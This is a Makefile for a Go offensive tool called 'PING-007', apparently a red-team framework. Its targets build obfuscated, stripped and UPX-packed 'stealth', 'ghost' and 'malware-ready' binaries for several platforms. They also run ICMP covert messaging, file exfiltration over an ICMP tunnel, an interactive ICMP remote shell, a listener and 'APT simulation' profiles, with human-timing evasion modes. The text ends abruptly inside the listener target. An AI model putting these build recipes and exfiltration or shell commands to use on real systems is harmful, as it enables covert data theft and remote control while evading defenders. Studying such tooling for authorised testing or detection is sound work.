# PING-007 Go Framework Makefile
# Professional build automation for red team operations

# Project information
PROJECT_NAME := ping-007
VERSION := 2.0.0
COMMIT := $(shell git rev-parse --short HEAD 2>/dev/null || echo "unknown")
BUILD_TIME := $(shell date -u +"%Y-%m-%dT%H:%M:%SZ")

# Build configuration
GO_VERSION := 1.21
BINARY_NAME := ping-007
BUILD_DIR := build
DIST_DIR := dist
CONFIG_DIR := config
LOGS_DIR := logs

# Go build flags
LDFLAGS := -ldflags "-s -w -X main.version=$(VERSION) -X main.buildTime=$(BUILD_TIME) -X main.commit=$(COMMIT)"
CGO_ENABLED := 0

# Target OS and architectures
PLATFORMS := linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64

# Colors for output
RED := \033[31m
GREEN := \033[32m
YELLOW := \033[33m
BLUE := \033[34m
MAGENTA := \033[35m
CYAN := \033[36m
WHITE := \033[37m
RESET := \033[0m

.PHONY: help build build-minimal build-embedded build-internet build-micro build-stealth build-ghost build-garble build-compressed build-armored install clean test lint format deps check-deps check-root demo setup package security-check benchmark dev docs quick-test vuln-check stats ci status basic stealth exfil apt shell listen analyze go-setup install-garble install-deps install-optional install-upx examples redteam-examples blueteam-examples crypto-tests crypto-demo ultra-stealth ghost-mode human-mimic natural-test

# Default target
all: clean deps test build

# Help target
help:
	@echo "$(CYAN) PING-007 Framework Build System$(RESET)"
	@echo "$(WHITE)═══════════════════════════════════════$(RESET)"
	@echo ""
	@echo "$(YELLOW)Build Targets:$(RESET)"
	@echo "  $(GREEN)build$(RESET)         - Build the binary for current platform"
	@echo "  $(GREEN)build-minimal$(RESET) - Build minimal version (no APT simulation)"
	@echo "  $(GREEN)build-embedded$(RESET)- Build with embedded config"
	@echo "  $(GREEN)build-internet$(RESET)- Build with Internet access defaults"
	@echo "  $(GREEN)build-stealth$(RESET) - Build with manual obfuscation"
	@echo "  $(GREEN)build-garble$(RESET)  - Build with Garble (requires Go 1.26+)"
	@echo "  $(GREEN)build-ghost$(RESET)   - Build with maximum obfuscation"
	@echo "  $(GREEN)build-compressed$(RESET) - Build with UPX compression"
	@echo "  $(GREEN)build-armored$(RESET) - Build ultimate stealth (obfuscation + UPX)"
	@echo "  $(GREEN)build-all$(RESET)     - Build binaries for all platforms"
	@echo ""
	@echo "$(YELLOW)Installation:$(RESET)"
	@echo "  $(GREEN)install$(RESET)       - Install binary to system PATH"
	@echo "  $(GREEN)install-deps$(RESET)  - Install optional dependencies (UPX, tools)"
	@echo "  $(GREEN)install-upx$(RESET)   - Install UPX compression tool only"
	@echo "  $(GREEN)go-setup$(RESET)      - Install Go and development tools"
	@echo "  $(GREEN)install-garble$(RESET) - Install Garble obfuscation tool"
	@echo ""
	@echo "$(YELLOW)Development:$(RESET)"
	@echo "  $(GREEN)clean$(RESET)         - Clean build artifacts"
	@echo "  $(GREEN)setup$(RESET)         - Setup development environment"
	@echo ""
	@echo "$(YELLOW)Framework Operations:$(RESET)"
	@echo "  $(GREEN)status$(RESET)        - Show framework status"
	@echo "  $(GREEN)basic$(RESET)         - Basic ICMP transmission (TARGET=ip DATA='msg')"
	@echo "  $(GREEN)stealth$(RESET)       - Stealth transmission with evasion (TARGET=ip)"
	@echo "  $(GREEN)exfil$(RESET)         - Data exfiltration (TARGET=ip FILE=path)"
	@echo "  $(GREEN)apt$(RESET)           - APT simulation (TARGET=ip PROFILE=name)"
	@echo "  $(GREEN)shell$(RESET)         - Interactive ICMP shell (TARGET=ip)"
	@echo "  $(GREEN)listen$(RESET)        - Data listener mode"
	@echo "  $(GREEN)analyze$(RESET)       - Network analysis mode"
	@echo ""
	@echo "$(YELLOW)Development:$(RESET)"
	@echo "  $(GREEN)test$(RESET)          - Run all tests"
	@echo "  $(GREEN)lint$(RESET)          - Run linting checks"
	@echo "  $(GREEN)format$(RESET)        - Format code using gofmt"
	@echo "  $(GREEN)deps$(RESET)          - Install/update dependencies"
	@echo "  $(GREEN)demo$(RESET)          - Run framework demonstration"
	@echo "  $(GREEN)security-check$(RESET) - Run security analysis"
	@echo "  $(GREEN)benchmark$(RESET)     - Run performance benchmarks"
	@echo ""
	@echo "$(YELLOW)Advanced Evasion Modes:$(RESET)"
	@echo "  $(GREEN)ultra-stealth$(RESET)    - Maximum evasion (human timing + sig rotation)"
	@echo "  $(GREEN)ghost-mode$(RESET)       - Near-invisible (10-30s delays + Windows sig)"
	@echo "  $(GREEN)human-mimic$(RESET)      - Natural behavior simulation"
	@echo ""
	@echo "$(YELLOW)Examples and Help:$(RESET)"
	@echo "  $(GREEN)examples$(RESET)      - Show detailed usage examples"
	@echo "  $(GREEN)redteam-examples$(RESET) - Red team operation examples"
	@echo "  $(GREEN)blueteam-examples$(RESET) - Blue team testing examples"
	@echo ""
	@echo "$(YELLOW)Build info:$(RESET)"
	@echo "  Version: $(MAGENTA)$(VERSION)$(RESET)"
	@echo "  Commit:  $(MAGENTA)$(COMMIT)$(RESET)"
	@echo "  Go:      $(MAGENTA)$(GO_VERSION)$(RESET)"

# Build for current platform
build: check-deps
	@echo "$(CYAN) Building $(PROJECT_NAME) v$(VERSION)...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME) ./cmd/ping-007
	@echo "$(GREEN)Build complete: $(BUILD_DIR)/$(BINARY_NAME)$(RESET)"

# Build minimal version (no APT simulation)
build-minimal: check-deps
	@echo "$(CYAN)Building minimal ICMP tool (no APT simulation)...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags minimal -ldflags "-s -w -X main.version=$(VERSION)" -o $(BUILD_DIR)/icmp-tool ./cmd/ping-007
	@echo "$(GREEN)Minimal build complete: $(BUILD_DIR)/icmp-tool$(RESET)"

# Build with embedded configuration
build-embedded: check-deps
	@echo "$(CYAN)Building with embedded configuration...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags embedded $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME)-configured ./cmd/ping-007
	@echo "$(GREEN)Embedded build complete: $(BUILD_DIR)/$(BINARY_NAME)-configured$(RESET)"

# Build with Internet access by default
build-internet: check-deps
	@echo "$(CYAN)Building with Internet access defaults...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags internet $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME)-internet ./cmd/ping-007
	@echo "$(GREEN)Internet build complete: $(BUILD_DIR)/$(BINARY_NAME)-internet$(RESET)"

# Build ultra-minimal stealth version
build-micro: check-deps
	@echo "$(CYAN)Building micro stealth version...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags "minimal,internet" \
		-ldflags "-s -w -X main.version=1.0.0" \
		-trimpath -o $(BUILD_DIR)/micro ./cmd/ping-007
	@echo "$(GREEN)Micro build complete: $(BUILD_DIR)/micro$(RESET)"
	@echo "$(YELLOW)Size comparison:$(RESET)"
	@ls -lh $(BUILD_DIR)/* 2>/dev/null | grep -E "(ping-007|icmp-tool|micro)" || true

# Combined build targets
build-minimal-internet: check-deps
	@echo "$(CYAN)Building minimal + Internet (malware-ready)...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags "minimal,internet" \
		-ldflags "-s -w -X main.version=1.0.0" \
		-trimpath -o $(BUILD_DIR)/micro-internet ./cmd/ping-007
	@echo "$(GREEN)Minimal+Internet build: $(BUILD_DIR)/micro-internet$(RESET)"

build-minimal-stealth: check-deps
	@echo "$(CYAN)Building minimal + stealth (small + obfuscated)...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags "minimal,stealth" \
		-ldflags "-s -w -X main.version= -X main.buildTime=" \
		-trimpath -o $(BUILD_DIR)/micro-stealth ./cmd/ping-007
	@echo "$(GREEN)Minimal+Stealth build: $(BUILD_DIR)/micro-stealth$(RESET)"

build-ultimate: check-deps
	@echo "$(CYAN)Building ULTIMATE version (minimal+internet+stealth)...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	CGO_ENABLED=$(CGO_ENABLED) go build -tags "minimal,internet,stealth" \
		-ldflags "-s -w -X main.version= -X main.buildTime= -X main.commit=" \
		-trimpath -o $(BUILD_DIR)/ultimate ./cmd/ping-007
	@if command -v upx >/dev/null 2>&1; then \
		echo "$(BLUE)Compressing with UPX...$(RESET)"; \
		upx --best $(BUILD_DIR)/ultimate; \
	else \
		echo "$(YELLOW)UPX not found, skipping compression$(RESET)"; \
	fi
	@echo "$(GREEN)ULTIMATE build: $(BUILD_DIR)/ultimate$(RESET)"

# Build with obfuscation (stealth)
build-stealth: check-deps
	@echo "$(CYAN) Building $(PROJECT_NAME) v$(VERSION) with manual obfuscation...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	@go_version=$$(go version | grep -oE 'go[0-9]+\.[0-9]+' | cut -c3-); \
	if [ "$$(echo "$$go_version >= 1.26" | bc 2>/dev/null || echo 0)" = "1" ]; then \
		echo "$(BLUE)Using Garble obfuscation...$(RESET)"; \
		export PATH="$$HOME/go/bin:$$PATH"; \
		CGO_ENABLED=$(CGO_ENABLED) garble -tiny -literals -seed=random build $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME)-stealth ./cmd/ping-007; \
	else \
		echo "$(YELLOW)Go version < 1.26, using manual obfuscation techniques...$(RESET)"; \
		CGO_ENABLED=$(CGO_ENABLED) go build \
			-ldflags "-s -w -X main.version=v2.0 -X main.buildTime=$$(date -u +%s) -X main.commit=$$(openssl rand -hex 6)" \
			-trimpath -buildmode=pie \
			-o $(BUILD_DIR)/$(BINARY_NAME)-stealth ./cmd/ping-007; \
	fi
	@echo "$(GREEN)Stealth build complete: $(BUILD_DIR)/$(BINARY_NAME)-stealth$(RESET)"
	@echo "$(YELLOW)Binary analysis:$(RESET)"
	@ls -lh $(BUILD_DIR)/$(BINARY_NAME)* 2>/dev/null || true
	@if command -v file >/dev/null 2>&1; then \
		echo "$(BLUE)File type:$(RESET)"; \
		file $(BUILD_DIR)/$(BINARY_NAME)-stealth; \
	fi

# Build with maximum obfuscation
build-ghost: check-deps
	@echo "$(CYAN)Building $(PROJECT_NAME) v$(VERSION) with maximum obfuscation...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	@go_version=$$(go version | grep -oE 'go[0-9]+\.[0-9]+' | cut -c3-); \
	if [ "$$(echo "$$go_version >= 1.26" | bc 2>/dev/null || echo 0)" = "1" ]; then \
		echo "$(BLUE)Using Garble maximum obfuscation...$(RESET)"; \
		export PATH="$$HOME/go/bin:$$PATH"; \
		CGO_ENABLED=$(CGO_ENABLED) garble -tiny -literals -seed=random -debugdir="" build \
			-ldflags "-s -w -X main.version=unknown -X main.buildTime=unknown -X main.commit=unknown" \
			-trimpath -o $(BUILD_DIR)/$(BINARY_NAME)-ghost ./cmd/ping-007; \
	else \
		echo "$(YELLOW)Go version < 1.26, using maximum manual obfuscation...$(RESET)"; \
		CGO_ENABLED=$(CGO_ENABLED) go build \
			-ldflags "-s -w -X main.version= -X main.buildTime= -X main.commit= -extldflags=-static" \
			-trimpath -buildmode=pie -tags netgo,osusergo \
			-o $(BUILD_DIR)/$(BINARY_NAME)-ghost ./cmd/ping-007; \
	fi
	@echo "$(GREEN)Ghost build complete: $(BUILD_DIR)/$(BINARY_NAME)-ghost$(RESET)"
	@echo "$(YELLOW)Stealth analysis:$(RESET)"
	@ls -lh $(BUILD_DIR)/$(BINARY_NAME)* 2>/dev/null || true
	@if command -v strings >/dev/null 2>&1; then \
		echo "$(BLUE)Visible strings (should be minimal):$(RESET)"; \
		strings $(BUILD_DIR)/$(BINARY_NAME)-ghost | head -10; \
		echo "$(BLUE)Total strings found: $$(strings $(BUILD_DIR)/$(BINARY_NAME)-ghost | wc -l)$(RESET)"; \
	fi

# UPX compression for smaller size
build-compressed: build install-upx
	@echo "$(CYAN)Compressing binary with UPX...$(RESET)"
	@cp $(BUILD_DIR)/$(BINARY_NAME) $(BUILD_DIR)/$(BINARY_NAME)-compressed
	@upx --best --lzma $(BUILD_DIR)/$(BINARY_NAME)-compressed
	@echo "$(GREEN)Compressed build: $(BUILD_DIR)/$(BINARY_NAME)-compressed$(RESET)"
	@echo "$(YELLOW)Compression analysis:$(RESET)"
	@echo "$(BLUE)Original vs Compressed:$(RESET)"
	@ls -lh $(BUILD_DIR)/$(BINARY_NAME) $(BUILD_DIR)/$(BINARY_NAME)-compressed 2>/dev/null || true
	@original_size=$$(stat -c%s $(BUILD_DIR)/$(BINARY_NAME)); \
	compressed_size=$$(stat -c%s $(BUILD_DIR)/$(BINARY_NAME)-compressed); \
	reduction=$$(echo "scale=1; ($$original_size - $$compressed_size) * 100 / $$original_size" | bc 2>/dev/null || echo "?"); \
	echo "$(BLUE)Compression ratio: $$reduction% reduction$(RESET)"

# Build with Garble (forces latest Go if needed)
build-garble: install-garble
	@echo "$(CYAN)🎭 Building $(PROJECT_NAME) v$(VERSION) with Garble obfuscation...$(RESET)"
	@mkdir -p $(BUILD_DIR)
	@echo "$(BLUE)Forcing Garble usage (may require Go upgrade)...$(RESET)"
	@export PATH="$$HOME/go/bin:$$PATH"; \
	CGO_ENABLED=$(CGO_ENABLED) garble -tiny -literals -seed=random build $(LDFLAGS) -o $(BUILD_DIR)/$(BINARY_NAME)-garble ./cmd/ping-007 || \
	(echo "$(RED) Garble failed. Run 'go install go@latest' to upgrade Go$(RESET)" && exit 1)
	@echo "$(GREEN)Garble build complete: $(BUILD_DIR)/$(BINARY_NAME)-garble$(RESET)"
	@echo "$(YELLOW)Garble analysis:$(RESET)"
	@ls -lh $(BUILD_DIR)/$(BINARY_NAME)-garble 2>/dev/null || true
	@if command -v strings >/dev/null 2>&1; then \
		echo "$(BLUE)Obfuscated strings: $$(strings $(BUILD_DIR)/$(BINARY_NAME)-garble | wc -l)$(RESET)"; \
	fi

# Build with anti-debug and packing (Ultimate stealth)
build-armored: build-stealth
	@echo "$(CYAN)Creating ultimate armored binary...$(RESET)"
	@echo "$(BLUE)Step 1: Starting with obfuscated binary$(RESET)"
	@cp $(BUILD_DIR)/$(BINARY_NAME)-stealth $(BUILD_DIR)/$(BINARY_NAME)-armored
	@echo "$(BLUE)Step 2: Applying compression (if available)$(RESET)"
	@if command -v upx >/dev/null 2>&1; then \
		upx --best --lzma $(BUILD_DIR)/$(BINARY_NAME)-armored; \
		echo "$(GREEN)UPX compression applied$(RESET)"; \
	else \
		echo "$(YELLOW)UPX not available, install with: make install-upx$(RESET)"; \
		echo "$(YELLOW)Using obfuscated binary only$(RESET)"; \
	fi
	@echo "$(BLUE)Step 3: Final analysis$(RESET)"
	@ls -lh $(BUILD_DIR)/$(BINARY_NAME)*armored 2>/dev/null || true
	@if command -v file >/dev/null 2>&1; then \
		file $(BUILD_DIR)/$(BINARY_NAME)-armored; \
	fi
	@echo "$(GREEN)Ultimate armored binary ready: $(BUILD_DIR)/$(BINARY_NAME)-armored$(RESET)"
	@echo "$(YELLOW) This binary combines: obfuscation + compression + stripping$(RESET)"

# Build for all platforms
build-all: check-deps
	@echo "$(CYAN) Building for all platforms...$(RESET)"
	@mkdir -p $(DIST_DIR)
	@for platform in $(PLATFORMS); do \
		OS=$$(echo $$platform | cut -d/ -f1); \
		ARCH=$$(echo $$platform | cut -d/ -f2); \
		OUTPUT_NAME=$(BINARY_NAME)-$$OS-$$ARCH; \
		if [ "$$OS" = "windows" ]; then OUTPUT_NAME=$$OUTPUT_NAME.exe; fi; \
		echo "$(BLUE)Building for $$OS/$$ARCH...$(RESET)"; \
		CGO_ENABLED=$(CGO_ENABLED) GOOS=$$OS GOARCH=$$ARCH go build $(LDFLAGS) -o $(DIST_DIR)/$$OUTPUT_NAME ./cmd/ping-007; \
		if [ $$? -eq 0 ]; then \
			echo "$(GREEN)Built: $(DIST_DIR)/$$OUTPUT_NAME$(RESET)"; \
		else \
			echo "$(RED) Failed to build for $$OS/$$ARCH$(RESET)"; \
		fi; \
	done

# Install binary to system
install: build check-root
	@echo "$(CYAN)Installing $(PROJECT_NAME)...$(RESET)"
	@sudo cp $(BUILD_DIR)/$(BINARY_NAME) /usr/local/bin/
	@sudo chmod +x /usr/local/bin/$(BINARY_NAME)
	@echo "$(GREEN)Installed to /usr/local/bin/$(BINARY_NAME)$(RESET)"
	@echo "$(YELLOW) Usage: sudo $(BINARY_NAME) --help$(RESET)"

# Clean build artifacts
clean:
	@echo "$(CYAN)🧹 Cleaning build artifacts...$(RESET)"
	@rm -rf $(BUILD_DIR) $(DIST_DIR)
	@rm -f coverage.out coverage.html benchmark.out
	@echo "$(GREEN)Clean complete$(RESET)"

# Run tests
test: check-deps
	@echo "$(CYAN) Running tests...$(RESET)"
	@mkdir -p $(LOGS_DIR)
	@go test -v -race -coverprofile=coverage.out ./...
	@go tool cover -html=coverage.out -o coverage.html
	@echo "$(GREEN)Tests complete. Coverage report: coverage.html$(RESET)"

# Run linting
lint: check-deps
	@echo "$(CYAN)Running linting checks...$(RESET)"
	@if command -v golangci-lint >/dev/null 2>&1; then \
		golangci-lint run; \
	else \
		echo "$(YELLOW)golangci-lint not found, using go vet$(RESET)"; \
		go vet ./...; \
	fi
	@echo "$(GREEN)Linting complete$(RESET)"

# Format code
format:
	@echo "$(CYAN)✨ Formatting code...$(RESET)"
	@go fmt ./...
	@if command -v goimports >/dev/null 2>&1; then \
		goimports -w .; \
	fi
	@echo "$(GREEN)Formatting complete$(RESET)"

# Install/update dependencies
deps:
	@echo "$(CYAN)📥 Installing dependencies...$(RESET)"
	@go mod download
	@go mod verify
	@go mod tidy
	@echo "$(GREEN)Dependencies updated$(RESET)"

# Check for required dependencies
check-deps:
	@echo "$(CYAN)Checking dependencies...$(RESET)"
	@command -v go >/dev/null 2>&1 || (echo "$(RED) Go is required but not installed$(RESET)" && exit 1)
	@go version | grep -q "go$(GO_VERSION)" || echo "$(YELLOW)Recommended Go version: $(GO_VERSION)$(RESET)"
	@echo "$(GREEN)Dependencies check passed$(RESET)"

# Check if running as root
check-root:
	@if [ "$$(id -u)" != "0" ]; then \
		echo "$(YELLOW)Root privileges may be required for raw socket operations$(RESET)"; \
		echo "$(YELLOW) Consider running with: sudo make install$(RESET)"; \
	fi

# Setup development environment
setup: deps
	@echo "$(CYAN)  Setting up development environment...$(RESET)"
	@mkdir -p $(CONFIG_DIR) $(LOGS_DIR) $(BUILD_DIR)

	# Install development tools
	@echo "$(BLUE)Installing development tools...$(RESET)"
	@go install github.com/golangci/golangci-lint/cmd/golangci-lint@latest 2>/dev/null || true
	@go install golang.org/x/tools/cmd/goimports@latest 2>/dev/null || true
	@go install github.com/air-verse/air@latest 2>/dev/null || true

	# Create default config if it doesn't exist
	@if [ ! -f $(CONFIG_DIR)/ping-007.yml ]; then \
		echo "$(BLUE)Creating default configuration...$(RESET)"; \
		mkdir -p $(CONFIG_DIR); \
		echo "framework:" > $(CONFIG_DIR)/ping-007.yml; \
		echo "  name: PING-007" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "  version: $(VERSION)" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "  environment: development" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "  debug_mode: true" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "  log_level: DEBUG" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "network:" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "  authorized_targets:" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "    - \"127.0.0.0/8\"" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "    - \"192.168.0.0/16\"" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "    - \"10.0.0.0/8\"" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "  timeout: 30" >> $(CONFIG_DIR)/ping-007.yml; \
		echo "  max_packet_size: 1500" >> $(CONFIG_DIR)/ping-007.yml; \
	fi

	@echo "$(GREEN)Development environment ready$(RESET)"
	@echo "$(YELLOW) Run 'make demo' to test the framework$(RESET)"

# Run framework demonstration
demo: build
	@echo "$(CYAN)Running PING-007 demonstration...$(RESET)"
	@echo "$(YELLOW)This will demonstrate core framework capabilities$(RESET)"
	@echo ""
	@echo "$(BLUE)1. Framework Status$(RESET)"
	@sudo $(BUILD_DIR)/$(BINARY_NAME) status || echo "$(RED) Status check failed - may need root privileges$(RESET)"
	@echo ""
	@echo "$(BLUE)2. Basic ICMP Test (to localhost)$(RESET)"
	@sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target 127.0.0.1 --data "Hello PING-007!" || echo "$(RED) Basic test failed$(RESET)"
	@echo ""
	@echo "$(GREEN)Demo complete$(RESET)"
	@echo "$(YELLOW) Try: sudo $(BUILD_DIR)/$(BINARY_NAME) --help$(RESET)"

# Create distribution packages
package: build-all
	@echo "$(CYAN)Creating distribution packages...$(RESET)"
	@mkdir -p $(DIST_DIR)/packages
	@for binary in $(DIST_DIR)/$(BINARY_NAME)-*; do \
		if [ -f "$$binary" ]; then \
			BASENAME=$$(basename $$binary); \
			OS_ARCH=$$(echo $$BASENAME | sed 's/$(BINARY_NAME)-//'); \
			PKG_NAME=$(PROJECT_NAME)-$(VERSION)-$$OS_ARCH; \
			PKG_DIR=$(DIST_DIR)/packages/$$PKG_NAME; \
			echo "$(BLUE)Creating package: $$PKG_NAME$(RESET)"; \
			mkdir -p $$PKG_DIR; \
			cp $$binary $$PKG_DIR/; \
			cp README.md $$PKG_DIR/ 2>/dev/null || true; \
			cp QUICKSTART.md $$PKG_DIR/ 2>/dev/null || true; \
			cp -r $(CONFIG_DIR) $$PKG_DIR/ 2>/dev/null || true; \
			cd $(DIST_DIR)/packages && tar -czf $$PKG_NAME.tar.gz $$PKG_NAME && rm -rf $$PKG_NAME; \
		fi; \
	done
	@echo "$(GREEN)Packages created in $(DIST_DIR)/packages/$(RESET)"

# Security analysis
security-check: check-deps
	@echo "$(CYAN)Running security analysis...$(RESET)"
	@if command -v gosec >/dev/null 2>&1; then \
		gosec ./...; \
	else \
		echo "$(YELLOW)gosec not found. Install with: go install github.com/securecodewarrior/gosec/v2/cmd/gosec@latest$(RESET)"; \
		echo "$(BLUE)Running basic security checks...$(RESET)"; \
		go vet -tags security ./...; \
	fi
	@echo "$(GREEN)Security analysis complete$(RESET)"

# Performance benchmarks
benchmark: check-deps
	@echo "$(CYAN)Running performance benchmarks...$(RESET)"
	@go test -bench=. -benchmem ./... | tee benchmark.out
	@echo "$(GREEN)Benchmarks complete. Results saved to benchmark.out$(RESET)"

# Live reload for development
dev: setup
	@echo "$(CYAN)🔄 Starting development mode with live reload...$(RESET)"
	@if command -v air >/dev/null 2>&1; then \
		air; \
	else \
		echo "$(YELLOW)air not found. Installing...$(RESET)"; \
		go install github.com/air-verse/air@latest; \
		air; \
	fi

# Generate documentation
docs:
	@echo "$(CYAN)📚 Generating documentation...$(RESET)"
	@if command -v godoc >/dev/null 2>&1; then \
		echo "$(BLUE)Starting godoc server on :6060$(RESET)"; \
		echo "$(YELLOW)Open http://localhost:6060/pkg/ping007/ in your browser$(RESET)"; \
		godoc -http=:6060; \
	else \
		echo "$(YELLOW)godoc not found. Install with: go install golang.org/x/tools/cmd/godoc@latest$(RESET)"; \
	fi

# Quick development test
quick-test:
	@echo "$(CYAN)Running quick tests...$(RESET)"
	@go test -short ./...
	@echo "$(GREEN)Quick tests complete$(RESET)"

# Check for Go vulnerabilities
vuln-check:
	@echo "$(CYAN)Checking for vulnerabilities...$(RESET)"
	@if command -v govulncheck >/dev/null 2>&1; then \
		govulncheck ./...; \
	else \
		echo "$(YELLOW)govulncheck not found. Install with: go install golang.org/x/vuln/cmd/govulncheck@latest$(RESET)"; \
	fi
	@echo "$(GREEN)Vulnerability check complete$(RESET)"

# Show project statistics
stats:
	@echo "$(CYAN)Project Statistics$(RESET)"
	@echo "$(WHITE)═══════════════════════════════════════$(RESET)"
	@echo "Lines of Go code:"
	@find . -name "*.go" -not -path "./vendor/*" | xargs wc -l | tail -1
	@echo ""
	@echo "Go files:"
	@find . -name "*.go" -not -path "./vendor/*" | wc -l
	@echo ""
	@echo "Packages:"
	@go list ./... | wc -l
	@echo ""
	@echo "Dependencies:"
	@go list -m all | wc -l

# Framework Operation Shortcuts
# These provide easy access to framework capabilities

status: build ## Show framework status
	@echo "$(CYAN)Framework Status Check$(RESET)"
	@sudo $(BUILD_DIR)/$(BINARY_NAME) status

basic: build ## Basic ICMP transmission (requires TARGET and DATA)
	@echo "$(CYAN)Basic ICMP Operation with Military-Grade Encryption$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make basic TARGET=192.168.1.100 DATA='test message' PASSWORD='secret123'$(RESET)"; \
		echo "$(YELLOW) Cryptographic Features: AES-256-GCM + ChaCha20 + XOR-CFB-HMAC with PBKDF2 + AAD$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)⚠️  No password provided - using random keys (non-interoperable)$(RESET)"; \
		echo "$(BLUE)💡 For secure bidirectional crypto use: PASSWORD='your-secure-password'$(RESET)"; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) basic --target $(TARGET) --data "$(if $(DATA),$(DATA),Hello from PING-007)" $(if $(PASSWORD),--password "$(PASSWORD)",) $(if $(SIGNATURE),--signature "$(SIGNATURE)",) $(if $(NO_SIGNATURE),--no-signature,) $(if $(DELAY),--delay "$(DELAY)",) $(if $(HUMAN_TIMING),--human-timing,) $(if $(ULTRA_STEALTH),--ultra-stealth,)

stealth: build ## Stealth transmission with military-grade encryption (requires TARGET)
	@echo "$(CYAN) Stealth Operation with Advanced Cryptographic Evasion$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make stealth TARGET=192.168.1.100 DATA='covert message' PASSWORD='secret123'$(RESET)"; \
		echo "$(YELLOW) Enhanced Features: Context-bound AAD + Algorithm rotation + Nonce collision resistance$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)⚠️  No password - using random keys (receiver needs same password for decryption)$(RESET)"; \
		echo "$(BLUE)💡 Recommended: PASSWORD='ops-key-$(shell date +%Y%m%d)'$(RESET)"; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) stealth --target $(TARGET) --data "$(if $(DATA),$(DATA),Stealth message from PING-007)" $(if $(PASSWORD),--password "$(PASSWORD)",)

exfil: build ## Data exfiltration (requires TARGET and FILE)
	@echo "$(CYAN)📤 Data Exfiltration$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make exfil TARGET=192.168.1.100 FILE=data.txt [PASSWORD='secret123'] [METHOD=icmp_tunnel] [MODE=stealth]$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(FILE)" ]; then \
		echo "$(RED) FILE required. Usage: make exfil TARGET=192.168.1.100 FILE=data.txt [PASSWORD='secret123'] [METHOD=icmp_tunnel] [MODE=stealth]$(RESET)"; \
		exit 1; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) exfil --target $(TARGET) --file $(FILE) \
		--method $(if $(METHOD),$(METHOD),icmp_tunnel) \
		--mode $(if $(MODE),$(MODE),stealth) \
		$(if $(CHUNK_SIZE),--chunk-size $(CHUNK_SIZE),) \
		$(if $(NO_STEALTH),--no-stealth,) \
		$(if $(NO_ENCRYPT),--no-encrypt,) \
		$(if $(PASSWORD),--password "$(PASSWORD)",)

apt: build ## APT simulation (requires TARGET and PROFILE)
	@echo "$(CYAN)🎭 APT Simulation$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make apt TARGET=192.168.1.100 PROFILE=lazarus [DURATION=300]$(RESET)"; \
		exit 1; \
	fi; \
	if [ -z "$(PROFILE)" ]; then \
		echo "$(RED) PROFILE required. Available: lazarus, apt29, apt28, equation$(RESET)"; \
		echo "$(YELLOW)Usage: make apt TARGET=192.168.1.100 PROFILE=lazarus [DURATION=300]$(RESET)"; \
		exit 1; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) apt --target $(TARGET) --profile $(PROFILE) --duration $(if $(DURATION),$(DURATION),300)

shell: build ## Interactive ICMP shell (requires TARGET)
	@echo "$(CYAN)Interactive Shell$(RESET)"
	@if [ -z "$(TARGET)" ]; then \
		echo "$(RED) TARGET required. Usage: make shell TARGET=192.168.1.100 [PASSWORD='secret123'] [MODE=interactive]$(RESET)"; \
		exit 1; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) shell --target $(TARGET) --mode $(if $(MODE),$(MODE),interactive) $(if $(PASSWORD),--password "$(PASSWORD)",)

listen: build ## Data listener with automatic decryption (requires PASSWORD)
	@echo "$(CYAN)👂 Listener Mode with Cryptographic Auto-Detection$(RESET)"
	@if [ -z "$(PASSWORD)" ]; then \
		echo "$(YELLOW)⚠️  No password - will only receive unencrypted data$(RESET)"; \
		echo "$(BLUE)💡 For encrypted reception use: PASSWORD='shared-secret'$(RESET)"; \
		echo "$(GREEN)🔍 Features: Algorithm detection + Context verification + Secure decryption$(RESET)"; \
	else \
		echo "$(GREEN)🔐 Secure mode: Will decrypt using shared password with algorithm auto-detection$(RESET)"; \
	fi; \
	sudo $(BUILD_DIR)/$(BINARY_NAME) listen \
		--interface $(if $(INTERFACE),$(INTERFACE),eth0) \
